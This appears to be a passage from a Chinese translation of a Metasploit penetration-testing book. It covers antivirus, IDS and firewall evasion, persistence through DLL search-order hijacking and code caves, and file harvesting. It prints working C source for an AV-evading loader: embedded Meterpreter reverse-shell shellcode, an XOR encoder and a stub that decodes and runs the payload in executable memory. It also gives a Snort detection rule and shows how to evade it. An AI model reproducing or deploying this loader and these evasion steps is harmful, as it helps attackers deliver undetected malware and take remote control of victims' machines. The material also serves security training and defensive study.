![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bef384f4-f63f-4844-9cd0-38256e707d93.png)

我们可以看到我们在端口 `4444` 上启动了一个匹配处理程序作为后台作业。让我们尝试在 Windows 系统上下载并执行 Meterpreter 后门，并检查是否能够获得反向连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d4903df9-f206-402c-b47c-81b1df91c631.png)

哎呀！看起来 AV 甚至不允许文件下载。嗯，在普通 Meterpreter 负载后门的情况下，这是相当典型的。让我们快速计算 `Sample.exe` 文件的 MD5 哈希如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5dee96cb-1a90-4cd1-84f4-76a000e0d789.png)

让我们检查一个流行的在线 AV 扫描器上的文件，比如 [`nodistribute.com/`](http://nodistribute.com/)，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/82eb15e4-d099-4cb8-ade2-55f35220f0e4.png)

嗯！我们可以看到 27/37 个杀毒软件解决方案检测到了该文件。相当糟糕，对吧？让我们看看如何通过使用 C 编程和一点编码来规避这种情况。让我们开始吧。

# 在 C 中编写自定义 Meterpreter 编码器/解码器

为了规避目标的安全控制，我们将使用自定义编码方案，比如 XOR 编码，然后再加上一两种其他编码。此外，我们将不使用传统的 PE/COFF 格式，而是生成 shellcode 来解决问题。让我们像之前为 PE 格式那样使用 `msfvenom`。但是，我们将把输出格式改为 C，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/68131936-78fd-4fcf-a68a-67838e2e55b4.png)

查看 `Sample.c` 文件的内容，我们有以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/57947eb7-ddcf-441f-9ddf-e13d88ab5f29.png)

由于我们已经准备好 shellcode，我们将在 C 中构建一个编码器，它将使用我们选择的字节 `0xAA` 进行 XOR 编码，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ce358121-f247-4bc6-ab51-9f6077d8e11a.png)

让我们看看如何创建一个 C 编码器程序，如下所示：

```
#include <Windows.h>
#include "stdafx.h"
#include <iostream>
#include <iomanip>
#include <conio.h>
unsigned char buf[] =
"\xbe\x95\xb2\x95\xfe\xdd\xc4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x56\x83\xc2\x04\x31\x72\x0f\x03\x72\x9a\x50\x60\x02\x4c\x16"
"\x8b\xfb\x8c\x77\x05\x1e\xbd\xb7\x71\x6a\xed\x07\xf1\x3e\x01"
"\xe3\x57\xab\x92\x81\x7f\xdc\x13\x2f\xa6\xd3\xa4\x1c\x9a\x72"
"\x26\x5f\xcf\x54\x17\x90\x02\x94\x50\xcd\xef\xc4\x09\x99\x42"
"\xf9\x3e\xd7\x5e\x72\x0c\xf9\xe6\x67\xc4\xf8\xc7\x39\x5f\xa3"
"\xc7\xb8\x8c\xdf\x41\xa3\xd1\xda\x18\x58\x21\x90\x9a\x88\x78"
"\x59\x30\xf5\xb5\xa8\x48\x31\x71\x53\x3f\x4b\x82\xee\x38\x88"
"\xf9\x34\xcc\x0b\x59\xbe\x76\xf0\x58\x13\xe0\x73\x56\xd8\x66"
"\xdb\x7a\xdf\xab\x57\x86\x54\x4a\xb8\x0f\x2e\x69\x1c\x54\xf4"
"\x10\x05\x30\x5b\x2c\x55\x9b\x04\x88\x1d\x31\x50\xa1\x7f\x5d"
"\x95\x88\x7f\x9d\xb1\x9b\x0c\xaf\x1e\x30\x9b\x83\xd7\x9e\x5c"
"\x92\xf0\x20\xb2\x1c\x90\xde\x33\x5c\xb8\x24\x67\x0c\xd2\x8d"
"\x08\xc7\x22\x31\xdd\x7d\x29\xa5\x1e\x29\x27\x50\xf7\x2b\x38"
"\x8b\x5b\xa2\xde\xfb\x33\xe4\x4e\xbc\xe3\x44\x3f\x54\xee\x4b"
"\x60\x44\x11\x86\x09\xef\xfe\x7e\x61\x98\x67\xdb\xf9\x39\x67"
"\xf6\x87\x7a\xe3\xf2\x78\x34\x04\x77\x6b\x21\x73\x77\x73\xb2"
"\x16\x77\x19\xb6\xb0\x20\xb5\xb4\xe5\x06\x1a\x46\xc0\x15\x5d"
"\xb8\x95\x2f\x15\x8f\x03\x0f\x41\xf0\xc3\x8f\x91\xa6\x89\x8f"
"\xf9\x1e\xea\xdc\x1c\x61\x27\x71\x8d\xf4\xc8\x23\x61\x5e\xa1"
"\xc9\x5c\xa8\x6e\x32\x8b\xaa\x69\xcc\x49\x85\xd1\xa4\xb1\x95"
"\xe1\x34\xd8\x15\xb2\x5c\x17\x39\x3d\xac\xd8\x90\x16\xa4\x53"
"\x75\xd4\x55\x63\x5c\xb8\xcb\x64\x53\x61\xfc\x1f\x1c\x96\xfd"
"\xdf\x34\xf3\xfe\xdf\x38\x05\xc3\x09\x01\x73\x02\x8a\x36\x8c"
"\x31\xaf\x1f\x07\x39\xe3\x60\x02";

int main()
{
 for (unsigned int i = 0; i < sizeof buf; ++i)
 {
  if (i % 15 == 0)
  {
   std::cout << "\"\n\"";
  }
  unsigned char val = (unsigned int)buf[i] ^ 0xAA;
  std::cout << "\\x" << std::hex << (unsigned int)val;
 }
 _getch();
 return 0;
}
```

这是一个直接的程序，我们将生成的 shellcode 复制到一个数组`buf[]`中，然后简单地迭代并对每个字节使用`0xAA`字节进行 Xor，并将其打印在屏幕上。编译和运行此程序将输出以下编码的有效负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/13486eca-c31a-4283-8d79-fd9e11831a9a.png)

现在我们有了编码的有效负载，我们需要编写一个解密存根可执行文件，它将在执行时将此有效负载转换为原始有效负载。解密存根可执行文件实际上将是交付给目标的最终可执行文件。要了解目标执行解密存根可执行文件时会发生什么，我们可以参考以下图表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/451beaca-4d35-40d9-972e-c0b20d37a8b6.png)

我们可以看到，在执行时，编码的 shellcode 被解码为其原始形式并执行。让我们编写一个简单的 C 程序来演示这一点，如下所示：

```
#include"stdafx.h"
#include <Windows.h>
#include <iostream>
#include <iomanip>
#include <conio.h>
unsigned char encoded[] =
"\x14\x3f\x18\x3f\x54\x77\x6e\x73\xde\x8e\x5e\xf0\x9b\x63\x1b"
"\xfc\x29\x68\xae\x9b\xd8\xa5\xa9\xd8\x30\xfa\xca\xa8\xe6\xbc"
"\x21\x51\x26\xdd\xaf\xb4\x17\x1d\xdb\xc0\x47\xad\x5b\x94\xab"
"\x49\xfd\x01\x38\x2b\xd5\x76\xb9\x85\xc\x79\x0e\xb6\x30\xd8"
"\x8c\xf5\x65\xfe\xbd\x3a\xa8\x3e\xfa\x67\x45\x6e\xa3\x33\xe8"
"\x53\x94\x7d\xf4\xd8\xa6\x53\x4c\xcd\x6e\x52\x6d\x93\xf5\x9"
"\x6d\x12\x26\x75\xeb\x9\x7b\x70\xb2\xf2\x8b\x3a\x30\x22\xd2"
"\xf3\x9a\x5f\x1f\x2\xe2\x9b\xdb\xf9\x95\xe1\x28\x44\x92\x22"
"\x53\x9e\x66\xa1\xf3\x14\xdc\x5a\xf2\xb9\x4a\xd9\xfc\x72\xcc"
"\x71\xd0\x75\x01\xfd\x2c\xfe\xe0\x12\xa5\x84\xc3\xb6\xfe\x5e"
"\xba\xaf\x9a\xf1\x86\xff\x31\xae\x22\xb7\x9b\xfa\xb\xd5\xf7"
"\x3f\x22\xd5\x37\x1b\x31\xa6\x5\xb4\x9a\x31\x29\x7d\x34\xf6"
"\x38\x5a\x8a\x18\xb6\x3a\x74\x99\xf6\x12\x8e\xcd\xa6\x78\x27"
"\xa2\x6d\x88\x9b\x77\xd7\x83\xf\xb4\x83\x8d\xfa\x5d\x81\x92"
"\x21\xf1\x8\x74\x51\x99\x4e\xe4\x16\x49\xee\x95\xfe\x44\xe1"
"\xca\xee\xbb\x2c\xa3\x45\x54\xd4\xcb\x32\xcd\x71\x53\x93\xcd"
"\x5c\x2d\xd0\x49\x58\xd2\x9e\xae\xdd\xc1\x8b\xd9\xdd\xd9\x18"
"\xbc\xdd\xb3\x1c\x1a\x8a\x1f\x1e\x4f\xac\xb0\xec\x6a\xbf\xf7"
"\x12\x3f\x85\xbf\x25\xa9\xa5\xeb\x5a\x69\x25\x3b\xc\x23\x25"
"\x53\xb4\x40\x76\xb6\xcb\x8d\xdb\x27\x5e\x62\x89\xcb\xf4\xb"
"\x63\xf6\x2\xc4\x98\x21\x00\xc3\x66\xe3\x2f\x7b\xe\x1b\x3f"
"\x4b\x9e\x72\xbf\x18\xf6\xbd\x93\x97\x6\x72\x3a\xbc\xe\xf9"
"\xdf\x7e\xff\xc9\xf6\x12\x61\xce\xf9\xcb\x56\xb5\xb6\x3c\x57"
"\x75\x9e\x59\x54\x75\x92\xaf\x69\xa3\xab\xd9\xa8\x20\x9c\x26"
"\x9b\x5\xb5\xad\x93\x49\xca\xa8\xaa";
int main()
{
 void *exec = VirtualAlloc(0, sizeof encoded, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

 for (unsigned int i = 0; i < sizeof encoded; ++i)
 {
  unsigned char val = (unsigned int)encoded[i] ^ 0xAA;
  encoded[i] = val;
 }
 memcpy(exec, encoded, sizeof encoded);
 ((void(*)())exec)();
 return 0;
}
```

再次，一个非常直接的程序；我们使用`VirtualAlloc`函数在调用程序的虚拟地址空间中保留空间。我们还使用`memcpy`将解码后的字节复制到`VirtualAlloc`指针保留的空间中。接下来，我们执行指针处保存的字节。所以，让我们测试一下我们的程序，看看它在目标环境中的运行情况。我们将按照相同的步骤进行；让我们找到程序的 MD5 哈希如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5618bdf3-5ade-4f9e-b88b-976fbf72bf8d.png)

让我们尝试下载和执行程序如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8a548de0-bb45-4956-bf86-535ab30927cd.png)

下载没有问题！耶！这是一个正常的弹出窗口，显示文件未知；没有什么可担心的。让我们尝试执行文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bbc42f2a-c24d-47b1-a6a3-03b2a9a71ff5.png)

砰砰！我们成功获得了在 64 位 Windows 10 操作系统上运行奇虎 360 高级杀毒软件的目标的 Meterpreter 访问权限，完全受保护和补丁。让我们也在[`nodistribute.com/`](http://nodistribute.com/)上试一试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/62fdbbdc-e501-4dc3-bd18-2a3cf0d58605.png)

我们可以看到，一些杀毒软件解决方案仍然将可执行文件标记为恶意软件。然而，我们的技术绕过了一些主要的参与者，包括 Avast、AVG、Avira、卡巴斯基、Comodo，甚至诺顿和麦克菲。其余的九个杀毒软件解决方案也可以通过一些技巧绕过，比如延迟执行、文件泵送等。让我们通过右键单击并使用奇虎 360 杀毒软件进行扫描来确认检查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/564f4424-7c8a-4f16-9faa-fa509d952776.png)

一切都没有问题！在整个过程中，我们看到了有效负载从可执行状态到 shellcode 形式的过程。我们看到了一个小型自定义解码器应用程序在绕过 AV 解决方案时的神奇效果。

# 使用 Metasploit 规避入侵检测系统

如果入侵检测系统存在，您在目标上的会话可能会很短暂。Snort，一种流行的 IDS 系统，可以在发现网络上的异常时生成快速警报。考虑以下利用启用了 Snort IDS 的目标的 Rejetto HFS 服务器的情况：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2cd53825-34da-4496-9c8e-0c311c4a519f.png)

我们可以看到我们成功获得了 Meterpreter 会话。然而，右侧的图像显示了一些一级问题。我必须承认，Snort 团队和社区创建的规则非常严格，有时很难绕过。然而，为了最大限度地覆盖 Metasploit 规避技术，并为了学习的目的，我们创建了一个简单的规则来检测易受攻击的 HFS 服务器上的登录，如下所示：

```
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SERVER-WEBAPP Rejetto HttpFileServer Login attempt"; content:"GET"; http_method; classtype:web-application-attack; sid:1000001;) 
```

上述规则是一个简单的规则，建议如果来自外部网络的任何`GET`请求在 HTTP 端口上使用任何端口到目标网络，则必须显示消息。您能想到我们如何绕过这样一个标准规则吗？让我们在下一节讨论一下。

# 使用随机案例进行娱乐和利润

由于我们正在处理 HTTP 请求，我们可以始终使用 Burp repeater 来帮助快速测试。因此，让我们并排使用 Snort 和 Burp 进行一些测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/73fdda54-4a07-4b89-bb2e-2d418a4e7bc1.png)

我们可以看到，一旦我们向目标 URI 发送请求，它就会被记录到 Snort 中，这不是好消息。尽管如此，我们看到了规则，我们知道 Snort 试图将`GET`的内容与请求中的内容进行匹配。让我们尝试修改`GET`请求的大小写并重复请求如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1db79df2-d221-4e13-93f7-a4f92acdc3ed.png)

没有生成新的日志！很好。我们刚刚看到了如何改变方法的大小写并愚弄一个简单的规则。但是，我们仍然不知道如何在 Metasploit 中实现这种技术。让我向你介绍规避选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/487c0e72-9ed9-4e9f-9170-720ab9a94986.png)

我们可以看到有很多规避选项可供我们选择。我知道你已经猜到了这一点。但是，如果你没有，我们将在这里使用`HTTP::method_random_case`选项，并按以下方式重试利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ac405b5a-334a-42a4-9725-40499fb22887.png)

让我们按以下方式利用目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9a0e1ff6-5c30-4c9f-ba54-2d71eff3c127.png)

我们很干净！是的！我们轻松地规避了规则。让我们在下一节中尝试一些更复杂的场景。

# 使用伪装目录来愚弄 IDS 系统

与以前的方法类似，我们可以在 Metasploit 中使用伪装目录来最终得出相同的结论。让我们看看以下规则集：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/407ae463-d3a1-4c57-b2e4-0d723ab9daf1.png)

我们可以看到前面的 Snort 规则检查传入数据包中的`POST /script`内容。我们可以用多种方法做到这一点，但让我们使用一种新方法，即伪装目录关系。这种技术将在到达相同目录时添加以前的随机目录；例如，如果文件存在于`/Nipun/abc.txt`文件夹中，模块将使用类似`/root/whatever/../../Nipun/abc.txt`的内容，这意味着它使用了其他目录，最终又回到了相同的目录。因此，这使得 URL 足够长，以提高 IDS 的效率循环。让我们考虑一个例子。

在这个练习中，我们将使用 Jenkins `script_console`命令执行漏洞来利用运行在`192.168.1.149`上的目标，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c907e3c3-7398-42ce-a58d-cce8bf2c269f.png)

我们可以看到 Jenkins 运行在目标 IP `192.168.1.149`的端口`8888`上。让我们使用`exploit/multi/http/Jenkins_script_console module`来利用目标。我们已经设置了`RHOST`、`RPORT`和`TARGEURI`等选项。让我们来利用系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/282a21d7-4f4d-4482-9058-24b757373cc1.png)

成功！我们可以看到我们轻松地获得了对目标的 Meterpreter 访问。让我们看看 Snort 为我们准备了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/791e6f5d-44fa-41db-8995-a42338f3f550.png)

看起来我们刚刚被发现了！让我们在 Metasploit 中设置以下规避选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7a7c47d8-51c4-42fd-872d-c1961127b156.png)

现在让我们重新运行利用程序，看看 Snort 中是否有任何信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/62879983-1596-4577-a2a3-0299424c4a38.png)

Snort 中没有任何信息！让我们看看我们的利用进行得如何：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/13dfb0f9-c600-45f8-a2f5-032de9a54477.png)

不错！我们再次规避了 Snort！随意尝试所有其他 Snort 规则，以更好地了解幕后的运作方式。

# 绕过 Windows 防火墙封锁的端口

当我们尝试在 Windows 目标系统上执行 Meterpreter 时，可能永远无法获得 Meterpreter 访问。这在管理员封锁了系统上的特定端口时很常见。在这个例子中，让我们尝试用一个聪明的 Metasploit 有效载荷来规避这种情况。让我们快速设置一个场景如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6cda48ca-1c52-4569-b2c1-084aa6d00543.png)

我们可以看到我们已经设置了一个新的防火墙规则，并指定了端口号`4444-6666`。继续下一步，我们将选择阻止这些出站端口，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/40a2eaf4-aeeb-45db-8583-99911e206125.png)

让我们检查防火墙状态和我们的规则：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/23ccbae1-c8af-4084-9004-c5a20638767b.png)

我们可以看到规则已经设置，并且我们的防火墙在家庭和公共网络上都已启用。考虑到我们在目标上运行了 Disk Pulse Enterprise 软件。我们已经在前几章中看到我们可以利用这个软件。让我们尝试执行利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/40216a0d-611c-46ab-ab4a-d882cc6a596b.png)

我们可以看到利用确实运行了，但我们没有访问目标，因为防火墙在端口`4444`上阻止了我们。

# 在所有端口上使用反向 Meterpreter

为了规避这种情况，我们将使用`windows/meterpreter/reverse_tcp_allports`有效载荷，它将尝试每个端口，并为我们提供对未被阻止的端口的访问。此外，由于我们只在端口`4444`上监听，我们需要将所有随机端口的流量重定向到我们端口`4444`。我们可以使用以下命令来实现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f24bc475-e0db-4ff5-a6f9-7a1114e18c9d.png)

让我们再次使用反向`tcp meterpreter`有效载荷在所有端口上执行利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5c34c905-caf8-4991-a477-bff3f8c5205d.png)

我们可以看到我们轻松地获得了对目标的 Meterpreter 访问。我们规避了 Windows 防火墙并获得了 Meterpreter 连接。这种技术在管理员对入站和出站端口采取积极态度的情况下非常有益。

此时，您可能会想知道前面的技术是否很重要，对吗？或者，您可能会感到困惑。让我们在 Wireshark 中查看整个过程，以了解数据包级别的情况：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0d1244a2-1930-4363-ae33-3510937c9db4.png)

我们可以看到最初，来自我们 kali 机器的数据被发送到端口`80`，导致缓冲区溢出。一旦攻击成功，目标系统与端口`6667`（在被阻止的端口范围之后的第一个端口）建立了连接。此外，由于我们将所有端口从`4444-7777`路由到端口`4444`，它被路由并最终回到端口`4444`，我们获得了 Meterpreter 访问权限。

# 总结和练习

在本章中，我们学习了使用自定义编码器的 AV 规避技术，我们绕过了 IDS 系统的签名匹配，还使用了所有 TCP 端口 Meterpreter 有效载荷避开了 Windows 防火墙封锁的端口。

您可以尝试以下练习来增强您的规避技能：

+   尝试延迟有效载荷的执行，而不使用解码器中的`sleep()`函数，并分析检测比率的变化

+   尝试使用其他逻辑操作，如 NOT，双重 XOR，并使用简单的密码，如 ROT 与有效载荷

+   绕过至少 3 个 Snort 签名并修复它们

+   学习并使用 SSH 隧道来绕过防火墙

下一章将大量依赖这些技术，并深入探讨 Metasploit。


# 第二十章：秘密特工的 Metasploit

本章介绍了执法机构将主要使用的各种技术。本章讨论的方法将扩展 Metasploit 的用途到监视和攻击性网络行动。在本章中，我们将探讨：

+   保持匿名的程序

+   在有效负载中使用混淆

+   使用 APT 技术实现持久性

+   从目标中获取文件

+   Python 在 Metasploit 中的力量

# 在 Meterpreter 会话中保持匿名性

作为执法人员，建议您在整个命令和控制会话中保持匿名性。然而，大多数执法机构使用 VPS 服务器来进行命令和控制软件，这是很好的，因为它们在其端点内引入了代理隧道。这也是执法人员可能不使用 Metasploit 的另一个原因，因为在您和目标之间添加代理是微不足道的。

让我们看看如何规避这种情况，使 Metasploit 不仅可用，而且成为执法机构的首选。考虑以下情景：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c5d1199f-831a-465b-9bbb-ce30f5b33bb5.png)

我们可以看到图中有三个公共 IP。我们的目标是`106.215.26.19`，我们的 Metasploit 实例正在`185.91.2xx.xxx`上的端口`8443`上运行。我们可以利用 Metasploit 的强大功能，在这里生成一个反向 HTTPS 有效负载，该有效负载提供了内置的代理服务。让我们创建一个简单的代理有效负载，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5db36886-7391-46db-a4c9-3f316d63555b.png)

我们可以看到，我们已经将`HTTPProxyHost`和`HTTPProxyPort`设置为我们的代理服务器，该服务器是运行 CCProxy 软件的基于 Windows 的操作系统，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d9ac17d0-8916-4d15-b4a8-4df8e668c6c5.png)

CCProxy 软件是 Windows 的代理服务器软件。我们可以轻松配置端口，甚至进行身份验证。通常最好实施身份验证，以便没有人可以在没有正确凭据的情况下使用您的代理。您可以在使用`HttpProxyPass`和`HttpProxyUser`选项生成有效负载时定义凭据。接下来，我们需要在`185.92.2xx.xxx`服务器上启动处理程序，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a734dc6b-eb41-4c2b-9db1-a602762ce398.png)

太棒了！我们可以看到我们很快就访问了我们的代理服务器。这意味着我们不再需要将我们的 Metasploit 设置从一个服务器移动到另一个服务器；我们可以有一个中间代理服务器，可以随时更改。让我们检查处理程序服务器上的流量，并检查我们是否从目标处获得任何直接命中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/192e645c-5d6d-4cf2-bcf6-ecaeb2b29a86.png)

不。我们从代理服务器得到了所有命中。我们刚刚看到了如何使用中间代理服务器对我们的 Metasploit 端点进行匿名化。

# 利用常见软件中的漏洞保持访问

DLL 搜索顺序劫持/DLL 植入技术是我最喜欢的持久性获取方法之一，可以在长时间访问中躲避管理员的监视。让我们在下一节中讨论这种技术。

# DLL 搜索顺序劫持

顾名思义，DLL 搜索顺序劫持漏洞允许攻击者劫持程序加载的 DLL 的搜索顺序，并使他们能够插入恶意 DLL 而不是合法的 DLL。

大多数情况下，一旦执行软件，它将在当前文件夹和`System32`文件夹中查找 DLL 文件。然而，有时在当前目录中找不到 DLL 时，它们会在`System32`文件夹中搜索，而不是直接从`System32`加载它们。攻击者可以利用这种情况，在当前文件夹中放置一个恶意 DLL 文件，并劫持本来应该直接从`System32`加载 DLL 的流程。让我们通过下面的图示来理解这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7593a117-ce5f-44e7-90a0-64f43f2fbcc6.png)

从前面的图表中，我们可以看到一个应用程序一旦执行，就会加载三个 DLL 文件，分别是 xx1、xx2 和 xx3。但是，它还会搜索一个当前目录中不存在的`yy1.dll`文件。在当前文件夹中找不到`yy1.dll`意味着程序将从`System32`文件夹跳转到`yy1.dll`。现在，假设攻击者将一个名为`yy1.dll`的恶意 DLL 文件放入应用程序的当前文件夹。执行将永远不会跳转到`System32`文件夹，并且将加载恶意植入的 DLL 文件，认为它是合法的。这些情况最终将为攻击者提供一个看起来很漂亮的 Meterpreter shell。因此，让我们尝试在标准应用程序（如 VLC 播放器）上进行如下操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d90aa0ec-6293-4906-aace-250f6da334c9.png)

让我们创建一个名为`CRYPTBASE.dll`的 DLL 文件。CryptBase 文件是大多数应用程序随附的通用文件。但是，VLC 播放器应该直接从 System32 引用它，而不是从当前目录引用它。为了劫持应用程序的流程，我们需要将此文件放在 VLC 播放器的程序文件目录中。因此，检查将不会失败，并且永远不会转到 System32。这意味着这个恶意的 DLL 将执行，而不是原始的 DLL。假设我们在目标端有一个 Meterpreter，并且我们可以看到 VLC 播放器已经安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4c850531-abc5-42b8-a5d9-8d08e740d3d7.png)

让我们浏览到 VLC 目录并将这个恶意的 DLL 上传到其中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/086a4bf2-dd80-4c22-a6dd-9cbfa4cca67c.png)

我们可以看到我们在目录上使用了`cd`并上传了恶意的 DLL 文件。让我们快速为我们的 DLL 生成一个处理程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e6a8324a-9f2d-4003-824d-c884bef7b513.png)

我们已经准备好了。一旦有人打开 VLC 播放器，我们就会得到一个 shell。让我们尝试代表用户执行 VLC 播放器如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a96056b0-f2ec-411c-bdbc-5c5f33e712d1.png)

我们可以看到我们的 DLL 已成功放置在文件夹中。让我们通过 Meterpreter 运行 VLC 如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/df28cbb5-8b59-4c1f-9a98-695227a9a1d3.png)

哇！我们可以看到，一旦我们执行了`vlc.exe`，我们就得到了另一个 shell。因此，我们现在可以控制系统，以便一旦有人执行 VLC，我们肯定会得到一个 shell。但是等等！让我们看看目标方面，看看一切是否顺利进行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3e6c9daa-7c87-41c3-b712-15b7f7c11b59.png)

目标端看起来不错，但没有 VLC 播放器。我们需要以某种方式生成 VLC 播放器，因为损坏的安装可能很快被替换/重新安装。VLC 播放器崩溃是因为它无法从`CRYPTBASE.DLL`文件中加载正确的函数，因为我们使用了恶意 DLL 而不是原始 DLL 文件。为了解决这个问题，我们将使用后门工厂工具来设置原始 DLL 文件的后门，并使用它来代替普通的 Meterpreter DLL。这意味着我们的后门文件将恢复 VLC 播放器的正常功能，并为我们提供对系统的访问权限。

# 使用代码洞藏隐藏后门

当后门被隐藏在程序可执行文件和库文件的空闲空间中时，通常会使用代码挖掘技术。该方法掩盖了通常位于空内存区域内的后门，然后修补了二进制文件，使其从后门开始运行。让我们按照以下方式修补 CryptBase DLL 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/36697485-50c9-4878-ac6f-074df9a61df7.png)

后门工厂随 Kali Linux 一起提供。我们使用`-f`开关定义要设置后门的 DLL 文件，使用`-S`开关指定有效载荷。`-H`和`-P`表示主机和端口，而`-o`开关指定输出文件。

`-Z`开关表示跳过可执行文件的签名过程。

一旦后门进程开始，我们将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/337532ab-03da-4f65-b725-8f1d376274b4.png)

我们可以看到后门工厂工具正在尝试在具有长度为`343`或更长的 DLL 中找到代码洞。让我们看看我们得到了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4453c970-0340-4f13-894a-7533bb238a22.png)

太棒了！我们得到了三个不同的代码洞，可以放置我们的 shellcode。让我们选择任意一个，比如说，第三个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dc4558bf-9fa4-4ec0-8b1f-786b0839b95f.png)

我们可以看到 DLL 现在已经被植入后门并修补，这意味着 DLL 的入口点现在将指向我们在`.reloc`部分中的 shellcode。我们可以将此文件放在易受攻击软件的`Program Files`目录中，这在我们的案例中是 VLC，并且它将开始执行，而不是像我们在前一节中看到的那样崩溃，这为我们提供了对机器的访问。

# 从目标系统中收集文件

在 Metasploit 中使用文件扫描功能非常简单。`enum_files`后渗透模块有助于自动化文件收集服务。让我们看看如何使用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/07d774f6-a28b-472a-b333-e25b963bfe11.png)

我们可以看到我们使用了`enum_files`后渗透模块。我们使用`FILE_GLOBS`作为`*.docx OR *.pdf OR *.xlsx`，这意味着搜索将发生在这三种文件格式上。接下来，我们只需将会话 ID 设置为`5`，这只是我们的会话标识符。我们可以看到，一旦我们运行了模块，它就会自动收集搜索期间找到的所有文件并下载它们。

# 使用毒液进行混淆

在上一章中，我们看到了如何使用自定义编码器击败 AV。让我们再进一步谈谈 Metasploit 有效载荷中的加密和混淆；我们可以使用一个名为**venom**的强大工具。让我们创建一些加密的 Meterpreter shellcode，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/91066b52-9866-428a-90ff-6a856f18f156.png)

